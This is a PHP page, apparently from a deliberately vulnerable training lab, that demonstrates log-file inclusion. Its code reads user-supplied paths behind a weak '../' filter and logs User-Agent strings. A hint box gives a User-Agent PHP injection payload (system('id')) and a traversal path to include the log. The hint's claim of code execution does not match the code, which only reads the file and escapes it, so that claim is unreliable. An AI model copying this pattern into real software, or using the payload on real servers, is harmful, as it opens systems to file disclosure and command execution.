<?php
// Nginx日志包含
$output = null;

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    $page = str_replace(['../', '..\\'], '', $page);
    $file = "pages/" . $page;
    $content = @file_get_contents($file);
    if ($content !== false) {
        $output = $content;
    } else {
        $output = "无法读取文件";
    }
}

// 记录访问日志
$log = date('Y-m-d H:i:s') . ' - ' . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . ' - ' . $_SERVER['REMOTE_ADDR'];
file_put_contents('logs/access.log', $log . "\n", FILE_APPEND);
?>

<p>页面查看（Nginx日志包含）</p>
<p>访问日志记录User-Agent，可通过包含日志文件执行代码。</p>

<form method="GET">
    <input type="hidden" name="id" value="<?= h($_GET['id'] ?? '') ?>">
    <label>页面路径</label>
    <input type="text" name="page" placeholder="页面名" value="<?= h($_GET['page'] ?? '') ?>">
    <button type="submit" class="btn btn-primary">查 看</button>
</form>

<?php if ($output): ?>
    <div class="result-box"><pre><?= h($output) ?></pre></div>
<?php endif; ?>

<div style="margin-top:1rem; padding:1rem; background:var(--bg-secondary); border-radius:var(--radius-sm); font-size:0.8rem;">
    <strong style="color:var(--warning);">日志包含攻击：</strong>
    <br>1. 在User-Agent中注入PHP代码：curl -A "&lt;?php system('id');?&gt;" http://target/
    <br>2. 包含日志文件：?page=../logs/access.log
    <br>3. PHP代码被执行
</div>
